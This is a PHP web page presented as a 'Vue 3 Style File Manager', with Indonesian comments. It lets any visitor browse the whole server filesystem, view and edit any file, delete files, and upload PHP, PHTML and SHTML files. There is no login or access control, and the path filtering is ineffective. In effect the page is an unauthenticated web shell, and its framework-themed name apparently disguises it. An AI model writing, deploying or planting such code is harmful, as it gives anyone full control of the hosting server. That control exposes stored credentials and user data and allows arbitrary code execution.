<?php
declare(strict_types=1);

// Menentukan path awal dan path saat ini berdasarkan parameter GET
$script_dir = str_replace('\\', '/', __DIR__);
$current_path = isset($_GET['path']) ? str_replace(['..', '\\'], '', $_GET['path']) : $script_dir;

if (!is_dir($current_path)) {
    $current_path = $script_dir;
}
$current_path = rtrim($current_path, '/');

$extensions = [
    'pdf', 'shtml', 'phtml', 'txt',
    'jpg', 'jpeg', 'png', 'php', 'html', 'css', 'js'
];

$maxSize = 10 * 1024 * 1024;
$message = '';
$msgType = 'success'; // success or error

// ==========================================
// HANDLE AKSI (POST / GET ACTIONS)
// ==========================================
$action = $_REQUEST['action'] ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 1. BUAT FOLDER BARU
    if ($action === 'create_folder') {
        $folderName = trim($_POST['folder_name'] ?? '');
        if ($folderName !== '' && !preg_match('/[\/\\:\*\?"<>\|]/', $folderName)) {
            $newFolderPath = $current_path . '/' . $folderName;
            if (!file_exists($newFolderPath)) {
                if (mkdir($newFolderPath, 0755, true)) {
                    $message = "Folder '$folderName' berhasil dibuat.";
                } else {
                    $message = "Gagal membuat folder."; $msgType = 'error';
                }
            } else {
                $message = "Folder sudah ada."; $msgType = 'error';
            }
        } else {
            $message = "Nama folder tidak valid."; $msgType = 'error';
        }
    }

    // 2. RENAME FILE / FOLDER
    elseif ($action === 'rename') {
        $oldName = $_POST['old_name'] ?? '';
        $newName = trim($_POST['new_name'] ?? '');
        $targetPath = $current_path . '/' . $oldName;
        $newPath = $current_path . '/' . $newName;

        if ($oldName !== '' && $newName !== '' && file_exists($targetPath)) {
            if (!file_exists($newPath)) {
                if (rename($targetPath, $newPath)) {
                    $message = "Berhasil mengubah nama menjadi '$newName'.";
                } else {
                    $message = "Gagal mengubah nama."; $msgType = 'error';
                }
            } else {
                $message = "Nama baru sudah digunakan."; $msgType = 'error';
            }
        } else {
            $message = "Target tidak ditemukan."; $msgType = 'error';
        }
    }

    // 3. EDIT / SIMPAN ISI FILE
    elseif ($action === 'save_file') {
        $fileName = $_POST['file_name'] ?? '';
        $fileContent = $_POST['file_content'] ?? '';
        $filePath = $current_path . '/' . $fileName;

        if ($fileName !== '' && is_file($filePath)) {
            if (file_put_contents($filePath, $fileContent) !== false) {
                $message = "File '$fileName' berhasil disimpan.";
            } else {
                $message = "Gagal menyimpan file."; $msgType = 'error';
            }
        } else {
            $message = "File tidak valid."; $msgType = 'error';
        }
    }

    // 4. UPLOAD FILE
    elseif (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        if (!is_array($file['name'])) {
            $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));

            if ($file['error'] !== UPLOAD_ERR_OK) {
                $message = 'Upload gagal. Error: ' . $file['error']; $msgType = 'error';
            } elseif ($file['size'] > $maxSize) {
                $message = 'File maksimal 10 MB.'; $msgType = 'error';
            } elseif (!in_array($ext, $extensions, true)) {
                $message = 'Ekstensi file tidak diizinkan.'; $msgType = 'error';
            } elseif (!is_writable($current_path)) {
                $message = 'Folder tidak memiliki izin tulis.'; $msgType = 'error';
            } else {
                $newName = bin2hex(random_bytes(8)) . '.' . $ext;
                $destination = $current_path . '/' . $newName;

                if (move_uploaded_file($file['tmp_name'], $destination)) {
                    chmod($destination, 0644);
                    $message = 'Upload berhasil: ' . $newName;
                } else {
                    $message = 'Gagal menyimpan file.'; $msgType = 'error';
                }
            }
        }
    }
}

// 5. HAPUS FILE / FOLDER (GET)
if ($action === 'delete') {
    $target = $_GET['target'] ?? '';
    $targetPath = $current_path . '/' . $target;

    if ($target !== '' && file_exists($targetPath)) {
        if (is_dir($targetPath)) {
            // Hapus folder rekursif sederhana atau pastikan kosong
            @rmdir($targetPath); 
            $message = "Folder berhasil dihapus.";
        } else {
            @unlink($targetPath);
            $message = "File berhasil dihapus.";
        }
    } else {
        $message = "Target hapus tidak ditemukan."; $msgType = 'error';
    }
    // Redirect untuk membersihkan URL query action
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

// ==========================================
// BACA DIREKTORI
// ==========================================
$items = scandir($current_path) ?: [];
$folders = [];
$files = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $fullPath = $current_path . '/' . $item;
    if (is_link($fullPath)) continue;

    if (is_dir($fullPath)) {
        $folders[] = $item;
    } elseif (is_file($fullPath)) {
        $files[] = $item;
    }
}

natcasesort($folders);
natcasesort($files);

// Mode View File / Edit File
$viewFile = $_GET['view'] ?? '';
$viewFilePath = $current_path . '/' . $viewFile;
$isEditing = ($viewFile !== '' && is_file($viewFilePath));
$fileContentToEdit = $isEditing ? (file_get_contents($viewFilePath) ?: '') : '';
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Vue 3 Style File Manager</title>
<style>
:root {
    --vue-green: #42b883;
    --vue-dark: #35495e;
    --bg-color: #f8fafc;
    --text-color: #2c3e50;
    --border-color: #e2e8f0;
}
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}
body {
    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: var(--bg-color);
    color: var(--text-color);
    padding: 20px;
}
.container {
    max-width: 1000px;
    margin: 0 auto;
}
.card {
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 4px 6px -1px rgba(0,0,0,.05), 0 2px 4px -1px rgba(0,0,0,.03);
    padding: 24px;
    margin-bottom: 20px;
    border: 1px solid var(--border-color);
}
h2, h3 {
    color: var(--vue-dark);
    margin-bottom: 16px;
}
.breadcrumb-bar {
    background: #f1f5f9;
    padding: 12px 16px;
    border-radius: 8px;
    font-family: monospace;
    font-size: 14px;
    display: flex;
    align-items: center;
    gap: 6px;
    overflow-x: auto;
    border: 1px solid var(--border-color);
    margin-bottom: 16px;
}
.breadcrumb-bar a {
    color: var(--vue-green);
    text-decoration: none;
    font-weight: 600;
}
.breadcrumb-bar a:hover {
    text-decoration: underline;
}
.actions-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
    margin-bottom: 20px;
}
@media (max-width: 768px) {
    .actions-grid { grid-template-columns: 1fr; }
}
.action-box {
    background: #f8fafc;
    padding: 16px;
    border-radius: 8px;
    border: 1px solid var(--border-color);
}
input[type="text"], input[type="file"], textarea {
    width: 100%;
    padding: 10px 14px;
    border: 1px solid var(--border-color);
    border-radius: 6px;
    font-size: 14px;
    outline: none;
    transition: border-color 0.2s;
    background: #fff;
}
input[type="text"]:focus, textarea:focus {
    border-color: var(--vue-green);
}
button {
    background: var(--vue-green);
    color: #fff;
    border: none;
    padding: 10px 18px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
    font-size: 14px;
    transition: background 0.2s;
}
button:hover {
    background: #33a06f;
}
.btn-danger {
    background: #ef4444;
}
.btn-danger:hover {
    background: #dc2626;
}
.btn-secondary {
    background: var(--vue-dark);
}
.btn-secondary:hover {
    background: #273444;
}
.alert {
    padding: 12px 16px;
    border-radius: 8px;
    margin-bottom: 16px;
    font-size: 14px;
}
.alert-success {
    background: #d1fae5;
    color: #065f46;
    border: 1px solid #a3e635;
}
.alert-error {
    background: #fee2e2;
    color: #991b1b;
    border: 1px solid #fca5a5;
}
.list-item {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 12px 16px;
    border-bottom: 1px solid var(--border-color);
    transition: background 0.1s;
}
.list-item:hover {
    background: #f8fafc;
}
.list-item:last-child {
    border-bottom: none;
}
.item-name {
    display: flex;
    align-items: center;
    gap: 10px;
    font-weight: 500;
}
.item-actions {
    display: flex;
    gap: 8px;
}
.badge {
    background: #e2e8f0;
    padding: 4px 8px;
    border-radius: 4px;
    font-size: 12px;
    color: #475569;
}
textarea.code-editor {
    font-family: monospace;
    height: 400px;
    line-height: 1.5;
    resize: vertical;
}
</style>
</head>
<body>

<div class="container">
    <div class="card">
        <h2>⚡ Vue 3 Style File Manager</h2>

        <!-- Breadcrumb Nav -->
        <div class="breadcrumb-bar">
            <span>📍</span>
            <?php 
                $parts = explode('/', trim($current_path, '/'));
                echo '<a href="?path=/">/</a>';
                $build = "";
                foreach($parts as $p) { 
                    if ($p === '') continue;
                    $build .= "/" . $p; 
                    echo ' / <a href="?path=' . urlencode($build) . '">' . htmlspecialchars($p) . '</a>'; 
                }
            ?>
        </div>

        <?php if ($message !== ''): ?>
            <div class="alert <?= ($msgType === 'error') ? 'alert-error' : 'alert-success' ?>">
                <?= htmlspecialchars($message) ?>
            </div>
        <?php endif; ?>

        <?php if ($isEditing): ?>
            <!-- EDITOR MODE -->
            <h3>Edit File: <?= htmlspecialchars($viewFile) ?></h3>
            <form method="POST" action="?path=<?= urlencode($current_path) ?>">
                <input type="hidden" name="action" value="save_file">
                <input type="hidden" name="file_name" value="<?= htmlspecialchars($viewFile) ?>">
                <div style="margin-bottom: 15px;">
                    <textarea name="file_content" class="code-editor"><?= htmlspecialchars($fileContentToEdit) ?></textarea>
                </div>
                <div style="display: flex; gap: 10px;">
                    <button type="submit">Simpan Perubahan</button>
                    <a href="?path=<?= urlencode($current_path) ?>"><button type="button" class="btn-secondary">Kembali</button></a>
                </div>
            </form>
        <?php else: ?>
            <!-- NORMAL MODE -->
            <div class="actions-grid">
                <!-- Buat Folder -->
                <div class="action-box">
                    <h3 style="font-size: 16px;">📁 Buat Folder Baru</h3>
                    <form method="POST" action="?path=<?= urlencode($current_path) ?>" style="display: flex; gap: 8px;">
                        <input type="hidden" name="action" value="create_folder">
                        <input type="text" name="folder_name" placeholder="Nama folder..." required>
                        <button type="submit">Buat</button>
                    </form>
                </div>

                <!-- Upload File -->
                <div class="action-box">
                    <h3 style="font-size: 16px;">📤 Upload File</h3>
                    <form method="POST" enctype="multipart/form-data" action="?path=<?= urlencode($current_path) ?>" style="display: flex; gap: 8px;">
                        <input type="file" name="file" required>
                        <button type="submit">Upload</button>
                    </form>
                </div>
            </div>

            <!-- DAFTAR FOLDER & FILE -->
            <div class="card" style="padding: 0; margin-bottom: 0; border: 1px solid var(--border-color);">
                <div style="padding: 16px; background: #f8fafc; border-bottom: 1px solid var(--border-color); font-weight: 600;">
                    Daftar Direktori & Berkas
                </div>

                <?php foreach ($folders as $folder): ?>
                    <div class="list-item">
                        <div class="item-name">
                            📁 <a href="?path=<?= urlencode($current_path . '/' . $folder) ?>" style="color: var(--vue-dark); text-decoration: none; font-weight: 600;">
                                <?= htmlspecialchars($folder) ?>
                            </a>
                        </div>
                        <div class="item-actions">
                            <button class="btn-secondary" onclick="renamePrompt('<?= htmlspecialchars($folder, ENT_QUOTES) ?>')">Rename</button>
                            <a href="?path=<?= urlencode($current_path) ?>&action=delete&target=<?= urlencode($folder) ?>" onclick="return confirm('Hapus folder ini?')">
                                <button class="btn-danger">Hapus</button>
                            </a>
                        </div>
                    </div>
                <?php endforeach; ?>

                <?php foreach ($files as $file): ?>
                    <div class="list-item">
                        <div class="item-name">
                            📄 <?= htmlspecialchars($file) ?> <span class="badge"><?= pathinfo($file, PATHINFO_EXTENSION) ?></span>
                        </div>
                        <div class="item-actions">
                            <a href="?path=<?= urlencode($current_path) ?>&view=<?= urlencode($file) ?>">
                                <button class="btn-secondary">Lihat / Edit</button>
                            </a>
                            <button class="btn-secondary" onclick="renamePrompt('<?= htmlspecialchars($file, ENT_QUOTES) ?>')">Rename</button>
                            <a href="?path=<?= urlencode($current_path) ?>&action=delete&target=<?= urlencode($file) ?>" onclick="return confirm('Hapus file ini?')">
                                <button class="btn-danger">Hapus</button>
                            </a>
                        </div>
                    </div>
                <?php endforeach; ?>

                <?php if (empty($folders) && empty($files)): ?>
                    <div style="padding: 30px; text-align: center; color: #64748b;">
                        Folder ini kosong.
                    </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>
</div>

<!-- Script Modal/Prompt Sederhana untuk Rename -->
<script>
function renamePrompt(oldName) {
    let newName = prompt("Masukkan nama baru:", oldName);
    if (newName && newName !== oldName) {
        let form = document.createElement('form');
        form.method = 'POST';
        form.action = window.location.href;

        let actionInput = document.createElement('input');
        actionInput.type = 'hidden';
        actionInput.name = 'action';
        actionInput.value = 'rename';

        let oldInput = document.createElement('input');
        oldInput.type = 'hidden';
        oldInput.name = 'old_name';
        oldInput.value = oldName;

        let newInput = document.createElement('input');
        newInput.type = 'hidden';
        newInput.name = 'new_name';
        newInput.value = newName;

        form.appendChild(actionInput);
        form.appendChild(oldInput);
        form.appendChild(newInput);
        document.body.appendChild(form);
        form.submit();
    }
}
</script>

</body>
</html>
